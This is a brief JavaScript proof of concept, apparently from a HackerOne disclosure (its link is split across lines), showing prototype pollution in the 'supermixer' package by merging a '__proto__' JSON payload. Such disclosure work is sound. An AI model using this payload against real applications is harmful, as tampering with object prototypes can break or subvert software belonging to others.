//hackerone.com/reports/959987

https:  
  var mixer = require("supermixer");
  obj = {};

   
  var payload = '{"__proto__":{"polluted":"yes"}}'; //payload

  mixer.merge({}, JSON.parse(payload));
// End of file
